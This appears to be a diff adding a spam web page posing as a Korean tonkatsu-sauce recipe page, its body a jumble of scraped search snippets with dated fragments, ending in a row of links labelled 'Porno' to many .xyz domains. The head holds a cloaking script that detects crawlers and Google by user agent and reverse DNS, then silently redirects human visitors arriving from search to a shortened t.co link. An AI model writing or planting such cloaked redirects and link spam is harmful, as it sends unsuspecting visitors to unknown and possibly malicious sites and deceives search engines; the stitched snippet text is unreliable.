@@ -1,0 +1,75 @@
+
+<html>
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CE934VD9JW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CE934VD9JW');
+</script>
+
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+function isCrawler() {
+	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+	var re = new RegExp(botPattern, 'i');
+	var userAgent = navigator.userAgent;
+	if (re.test(userAgent)) {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+function get_ip() {
+	var value = $.ajax({
+		url: 'https://api.ipify.org/?format=json',
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+function gethostbyname() {
+	var value = $.ajax({
+		url: "https://get.geojs.io/v1/dns/ptr.json",
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+var real_ip = get_ip().ip;
+var hostname = gethostbyname().ptr;
+
+
+function is_google() {
+	if (hostname.indexOf(".google.com") != '-1' || hostname.indexOf(".googlebot.com") != '-1') {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+//search zone start//
+if (is_google() == false) {
+	if (document.referrer) {
+		if (isCrawler() != true && is_google() != true) {
+            window.location="https://t.co/8yIHdLe9bL"; 
+
+		}
+	}
+}
+//search zone finish//
+</script>
+<title>6054</title>
+</script>
+</head>
+<body>
+<h1>돈가스 소스 만들기</h1>
+<p>루를 만드는 동안 소스를 만들어 줍니다. 물3(종이컵)+간장1+케찹1+설탕1+식초1/2(소주컵)을 볼에 넣어 설탕과 케찹 ...2019-06-14 — 돈까스 소스를 만들기 위해서 먼저 루를 만들어야해요. 보통 버터와 밀가루를 1:1로 넣어서 만든답니다. 저는 버터 4T+밀가루4T를 넣어서 만들어주었어요.: 팬에 물, 돈가스 소스, 토마토, 양파, 소금, 후추를 넣고 강불로 끓이다가 '루'를 넣고 약불로 끓인다. '특급 비법' 소스만들기 완성! ... : 양배추, 적채를 잘게 채 썬 후 ...2021-11-05 — 2. 만드는 방법 · 1) 프라이팬에 밀가루와 버터를 같이 넣고 볶아 '루(roux)'를 만들어주세요. 약불로 하셔야 타지 않습니다. · 2) 루가 진한 갈색이 되면 ...2015-08-05 — 백종원 돈까스소스 레시피! 집밥 백선생 데미글라스 소스 만드는법(옛날 돈가스 소스 만들기,경양식 돈까스 소스,우스터소스 대체) 요즘에는 다양한 ...2021-02-01 — 옛날 돈까스 소스 만들기, 경양식 돈까스 소스 만드는 방법, 돈가스 소스 레시피 ... 버터, 밀가루, 우유를 제외한 나머지 재료를 먼저 만들어주세요.2022-10-10 — 만드는 법 · 1. 버터 1: 밀가루1 을 넣어 볶는다. · 2. 루 색깔이 갈색이 될때까지 볶아줘야 한다. · 3. 우스타소스 6, 케첩 1, 설탕 1, 물 머그잔 한 컵 · 4.2015-08-06 — 우스타소스가 없을때에는 간장 1, 식초 2/1 을 대신 쓰면 되요~~여기다가 케찹 1, 설탕 1, 물 종이컵 3컵 넣으면 된답니다. 루에 대해서는 처음 알게 ...2014-01-15 — 돈가스 소스.. ... 간단하게는 케찹3, 설탕2, 식초1, 간장1 정도에 물을 약간 넣어서 묽기를 맞추고 끓이기만하면 그럭저럭 먹을만한 소스가 된다. 약간 ...Explore Instagram posts for tag #돈까스소스만들기 - Picuki.com. ... 레시피 안내해드릴게요 ⭐️경양식 돈가스 소스 간단 #레시피 (2~3개) 준비물: 버터 30g, ...2017. 12. 28 - 백종원 돈까스소스 레시피! 집밥 백선생 데미글라스 소스 만드는법(옛날 돈가스 소스 만들기,경양식 돈까스 소스,우스터소스 대체) 요즘에는 다양한 ...2017-10-25 — 일식 돈가스 전문점과 맛 싱크로율 100% · 초간단 일식돈가스 소스 만드는 방법 · 물한컵, 우스터소스 반컵, 케첩 1/3컵, 간장 1/4컵, 설탕 3숟갈 · 감자전분 ...2019-03-17 — [백선생 레시피] 돈가스소스 만드는 방법 (백종원 레시피) · [백종원 돈가스소스 만드는 방법 - 재료] · 밀가루 1소주컵 · 버터 · 물 2컵 · 우스터 소스 1소주 ...두근두근 레시피~. 돈까스 만드는법,돈가스 소스 만들기 집에서 해요~. saakrang | 2016-02-03 | 조회수 4182 ...2022-08-22 — 매운 돈가스 소스 오늘 점심은 돈가스를 활용하여 매운 돈가스를 만들었습니다. 매콤한 돈가스 소스 생각이 나서 매콤한 소스를 만들어서 돈가스 위에 ...2022-01-05 — 이때 4~5인분 기준으로 옛날식 돈가스 소스의 황금레시피를 알려드리자면... 우유 1컵(200ml), 물 2컵(400ml), 케첩 2/3컵 130ml, 우스터소시 6큰술, 설탕 ...2020-05-13 — 소스랑 우유를 1:1로 해서 1컵 반 정도가 적당할 거 같습니다. * 돈까스는 아래 링크를 참조해 만듭니다. [[캐나다/토론토] 돈까스(돈가스) 만들기 ...2015-09-19 — 돈가스 소스 만들기가 화제인 가운데, 백종원의 돈가스 레시피도 덩달아 눈길을 끈다. 지난달 4일 방송된 tvN `집밥 백선생` 12회에서 백종원은 추억 ...2022-04-12 — 돈까스 소스 만들기 ... 어렵지 않습니다. ... 밀가루와 함께 1:1 비율로 넣어줄 건데요. ... 8조각을 넣어주었답니다. ... 양파를 잘게 다져서 함께 넣어줄 ...2020-01-28 — 돈까스를 직접 만드는 전문점은 소스도 알아서 잘 만들지만, 전문 셰프 없이 냉동 돈까스를 사용하는 업소는 맛있는 소스를 만들기 쉽지 않은 것이 ...2020-09-04 — 집밥 백선생 수제 돈까스 만들기돈까스 소스 만들기. § 다양한돈까스소스만들기 §. ♧ Cooking Tips ♧. 1. 냄비에 케찹5T, 우스터소스2T, 핫소스1T, ...2019-03-27 — 그래서 이번에는 돈까스 소스 만드는레시피를 준비 했습니다.^^ 백종원표 일본식돈까스 소스 만들기 재료 1. 물2. 우스터 소스3. 케첩4. 진간장5.2023-04-26 — 최요비! 최고의 요리비결 정미경 요리연구가의 추억의 경양식집 옛날돈까스. 마요네즈케찹 양배추샐러드와 간단하게 만드는 돈가스소스 레시피.2018-02-06 — 일식 돈가스 전문점 바로 그 맛! 싱크로율 100% 소스 만드는 법을. 백종원 레시피로 만들어 보았아요.2017-06-27 — 집밥백선생1 돈까스 소스 만들기 (백종원 돈가스 소스 만드는방법) 재료 : 밀가루, 버터, 우스터소스, 케찹, 설탕, 물, 우유 1. 팬에 밀가루와 버터를 ...2022-09-17 — 정육점에서 돈가스 고기를 사다가 만들었어요. 정육점에서 아예 돈가스용으로 썰어서 기계로 눌러서 주니 소금, 후춧가루 간만 해서 밀가루, 계란물, ...고추장을 넣어 매콤하게 끌리는 '매운 돈까스소스 만드는 법' · ▣ 소스 만들기 : 그릇에 잘게 다진 청양고추 1개, 케찹4, 매운 고추장1.5, 간장1, 올리고당3, 식초1.5, ...2015-08-05 — 집밥 백선생 우스타 없이 돈가스소스 만들기 · 추억의 왕돈까스~~ 히히 다들 생각나시지요~? · 요즘은 일부러 남산이나 성북동에 가야 먹을수 있는 돈까스가 ...2002-08-27 — 시판 돈가스소스 4큰술, 물 ½컵, 녹말물 2큰술). 만드는 방법. 1 돼지고기는 된장들깨가루양념을 발라 30분간 재운다. 2 ①은 돈가스 튀김옷을 입혀 ...2019-07-18 — 돈가스소스 만들기 · 10분 뒤에 깨끗한 물에 두어번 헹구고 · 마요네즈 4큰술, 토마토케찹 3큰술, 메이플시럽 1큰술 · 이제 돈가스소스를 만들겁니다. · 물 2 ...일본식 돈가스 소스 만드는 방법 + 백종원 돈가스소스 황금레시피 + 겹겹이 돈가스 만들기. 스북 2017. 10. 30. 15:37. 일본식 돈가스 소스 만드는 방법 + 백종원 ...지난 4일 방송된 케이블TV tvN 예능 프로그램 '집밥 백선생'에서는 백종원이 돈가스 소스 만들기를 알려주는 모습이 그려졌다. 백종원은 “돈까스 소스는 데미글라스가 ...2020-12-21 — 다진 양파와 다진 마늘을 식용유를 넣고 달달 볶아요~~ 돈까스소스 만들기 4총사 재료! 노르스름하게 볶아지면 4총사 재료를 반 컵씩 넣어요~~ 4총사 ...2020-06-26 — 찾아 수제 돈까스를 만들어보았습니다. 특별히 돼지고기가 아닌. 닭고기를 이용했는데요,. 더욱 부드러운 식감의. 돈가스 만들기 알려드릴게요~!.2019-02-18 — 확인해 보기위해 돈까스소스 만들기 도전!! ☞ 재료 소주컵기준 : 밀가루1 버터1 간장1 케찹1 식초1/2 설탕 1/22017-12-26 — 알토란 돈가스 만드는법 - 정호영 수제 돈가스 소스 만들기 (알토란 돈까스 레시피) 수제 돈까스 소스 만드는방법 1만원으로 즐기는 건강 만찬.2015-09-18 — 백종원표 돈가스 소스 만들기가 공개됐다.지난 8월 4일 방송된 tvN '집밥 백선생'은 '추억의 경양식 돈가스 풀코스' 특집으로 꾸며졌다.2015-09-18 — 돈가스 소스 만들기가 눈길을 모으고 있다. 지난 8월 4일 방송된 tvN '집밥 백선생'에서는 '추억의 경양식 돈가스 풀코스' 특집으로 꾸며져 백종원 표 ...2015-08-22 — 수많은 시행착오를 겪었던 돈까스소스(돈까스×, 돈가스○지만 돈까스로 씀)에 드디어 종지부를 찍는다!!! 나에게 해법을 준 것은 &lt;집밥 백선생&gt;.2016-03-26 — 돈가스 소스 만들기 요리재료는 우스터소스 6큰술(75ml), 양파 1/10개(20g), 토마토케첩 4큰술(40g), 설탕 1과 1/2큰술(15g), 파인애플(다진 파인애플) 1 ...2013-06-10 — 돈까스 소스 만들기. 오늘은 간단히 만들수 있는 돈까스 소스 입니다. 흔히 시중에 많이 파는 소스이기도 하지만. 보통은 맛이 너무 새콤하고 색또한 ...2010-10-13 — 빵가루. 다진마늘1/3T. 맛술1T.고운소금1/4T. 후추가루약간, 참기름1/2T. 돈가스 소스 만들기 : 시판 ...2015-09-18 — 돈가스 소스 만들기 [사진 tvN 집밥 백선생 방영분 캡쳐]돈가스 소스 만들기 돈가스 소스 만들기가 화제인 가운데, 백종원의 돈가스와 돈…prieš 20 valandų — 돈까스 소스를 만들기 위해서 먼저 루를 만들어야해요. ... 집밥 백선생 데미글라스 소스 만드는법(옛날 돈가스 소스 만들기,경양식 돈까스 소스, ...prieš 8 valandas — 재료 : 돈까스용 돼지고기 2근 , 우유 3컵준비, 식빵 .빵가루, 계란 2개.26 oct. 2020 — 돈가스 소스 만들기 황금레시피 · 1. 케찹(5)+우스터소스(2)+ ...prieš 18 valandų — 2015 — 집밥 백선생 돈가스 레시피 #2 돈가스 만들기 &amp; 잘 튀기는 방법 데미그라소스 &amp; 크림수프 &amp; 옛날 왕 돈가스 소스 만드는법 이번에는집밥 ...prieš 3 dienas — 후춧가루 [백종원 돈가스소스 만드는 방법 자 그럼 따라 하면 절대 실패할 수 없는 백종원 돈가스 덮밥 만들기 레시피로 가츠동 시작해보겠습니다.5 ...prieš 2 valandas — 백종원 돈까스, 경양식 돈까스 소스 만들기 옛날 엄마손 잡고 가서 먹던 그맛~ 백종원 ... [백종원 돈가스소스 만드는 방법 – 재료] 밀가루 1소주컵.백종원 돈까스, 경양식 돈까스 소스 만들기 옛날 엄마손 잡고 가서 먹던 그맛~ 백종원표 경양식돈까스 ... [백종원 돈가스소스 만드는 방법 – 재료] 밀가루 1소주컵.백종원 돈까스, 경양식 돈까스 소스 만들기 옛날 엄마손 잡고 가서 먹던 그맛~ 백종원표 경양식돈까스 ... [백종원 돈가스소스 만드는 방법 – 재료] 밀가루 1소주컵.돈가스X우스터소스' 조합 모르면 백종원 실망! @백종원의 골목식당. HD · '돈가스X우스터소스' 조합 ... 백종원표 수제 돈가스 소스 만들기ㅣ#집밥백선상3 170502 EP12.prieš 8 valandas — 2021 — 함박스테이크 만들기 바로 시작할게요. 재료 소고기 다짐육 300g 돼지고기 다짐육 600g 양파 1개 빵가루 3큰술 소금, 후추 조금씩 &lt;소스&gt; ...prieš 3 valandas — 있으니 #가츠동소스 만 신경 써서. 만들면 되니까 편하네요.31 aug. 2016 — 집밥 백선생 양파돈가스덮밥 레시피 (백종원 양파돈까스덮밥 만들기) ...prieš 5 valandas — 2017 — 데미글라스소스 만들기 (옛날돈가스 소스) … 베이스 재료인 루 말고도, 케찹과 우스터소스도 필요하다. … 백종원 그레이비소스 레시피 2.19 ...prieš 9 valandas — 찹 스테이크 만들기 찹스테이크 소스 만들기..백종원표 스테이크 소스 : 시판 스테이크소스 ( 또는 돈가스소스) 4큰술 굴소스 2큰술 케찹 1.5큰술 ...prieš 12 valandų — 바삭하게 튀긴 돈가스에 덮밥소스가 촉촉히 베어 들어가서 부드러운 ... 2016 — 집밥 백선생 양파돈가스덮밥 레시피 (백종원 양파돈까스덮밥 만들기) ...prieš 18 valandų — 드레싱 만들기에 자신 …com 양배추 샐러드 드레싱 만들기 | 건강한 유기농 양배추 샐러드; 양배추 요리하고 남은 걸로; 돈까스집 드레싱 따라잡기 – ...prieš 10 valandų — 2019 — 오늘은 생선까스 소스 타르타르소스 만들기 에 대하여. ... 2021 — 돈가스보다 생선가스를 더 좋아하게 만들어준 소스.prieš 12 valandų — 집밥 백선생 돈까스 샌드위치 만드는법 (냉동 돈까스 튀기는법,돈가스 튀기기 온도 ... 냉동돈까스 에어프라이어 레시피 경양식 돈까스 소스 만들기 …prieš 4 valandas — (간편조리) 등심+치즈돈까스+특제소스, 10팩 30,910 원 식자재왕 순살 등심 ... 수정일 : 2018-09-13 에어프라이어 바삭한 돈까스 만들기 1) 주재료 ...그러나 화려한 메 김치돈까스나베 만들기 돈까스나베 만드는법 나베라는 말은 냄비 ... 생선까스 소스@타르타르소스 만들기~~ 돈까스김치나베 에 들어갈 재료들이예요 ...그러나 화려한 메 김치돈까스나베 만들기 돈까스나베 만드는법 나베라는 말은 냄비 ... 생선까스 소스@타르타르소스 만들기~~ 돈까스김치나베 에 들어갈 재료들이예요 ...prieš 13 valandų — 혹시 스테이크소스가 없으면 돈까스소스로 해도 무관해요. (스테이크 소스만들기 ) 간장4큰술, 와인2큰술, 꿀1큰술 백종원 찹스테이크 만들기 레시피 ...2023-04-06 — ... 의 마음을 사로잡다~ 2인분 20분 이내 초급 재료 Ingredients [재료] 돼지고기 목살 구매 300g 후추 구매 톡톡 [소스만들기] 돈가스 소스 구매 1.prieš 4 valandas — ENG 라드유만들기 건강한 기름 영국 BBC가 선정한 세계 8대 영양식품 How To Render Lard ... 이외에도 감자튀김이나 돈가스 소스 만들기 …2 dec.고구마돈가스는 옛날 돈가스소스 아시나요?! ... 고구마치즈돈까스 만들기. ... 3NTxm16 에어프라이어로 바삭한 수제 돈까스 만들기 사실 돈까스를 만드는 방법은 고기 ...prieš 19 valandų — 고구마돈가스는 옛날 돈가스소스 아시나요?! ... 에어프라이어로 바삭한 수제 돈까스 만들기 사실 돈까스를 만드는 방법은 고기에 밀가루-계란-빵가루 ...스테이크는 버터, 돈가스 소스, 케첩 (스파게티 소스)을 넣어 3분 만에 완성 ... 2스푼 생략 가능 존재하지 않는 이미지입니다 닭가슴살 샐러드 소스 만들기 먼저 냉채 ...prieš 11 valandų — 그 다음으로 중요한 작업이다 바베큐 폭립 소스 만들기. ... 큰술 물 구매 200ml 노하우 영상 돈가스소스 조리법 진간장 조리법 올리고당 조리법 다진 ...2023-04-11 — 스테이크 소스 만드는 법 10분 안에 완성 가능합니다. 돈가스, 소고기, 함박 스테이크와 모두 잘 어울립니다. 백종원 선생님이 우스터소스 A.1.1.2023-04-11 — 스테이크 소스 만드는 법 10분 안에 완성 가능합니다. 돈가스, 소고기, 함박 스테이크와 모두 잘 어울립니다. 백종원 선생님이 우스터소스 A.1.1.prieš 8 valandas — 스테이크는 버터, 돈가스 소스, 케첩 (스파게티 소스)을 넣어 3분 만에 ... 닭가슴살 샐러드 소스 만들기 먼저 냉채소스부터 만들어둘게요 소스는 ...2023-04-11 — 스테이크 소스 만드는 법 10분 안에 완성 가능합니다. 돈가스, 소고기, 함박 스테이크와 모두 잘 어울립니다. 백종원 선생님이 우스터소스 A.1.1.묵은지참치말이 만들기 싸다김밥 메뉴 돈가스 입니다. 포장지를 뜯으면 반찬으로 김치, 콩나물, 단무지 밥이 있고요. 돈가스 소스 계란 후라이 돈가스가 있습니다.이번에는 홀스래디쉬소스 만들기~ 역시 양파를 잘게 다져서 준비하구요~ 소스를 담을 그릇에 양파 ... 양파, 당근 샐러드 드레싱 2.4 돈가스 스시 소스 경우에 따라서, ...<a href="https://soktumun.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fremon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freejon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://memcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dilaracuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dudikli.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://haruncuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freefon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://duraman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeeon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fittirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://furtuni.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://supersan.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://saklaman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeron.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freecon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://yuppik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freenon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://sirikim.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://cemcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dandirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a></p>
+</body>
+</html>
+    
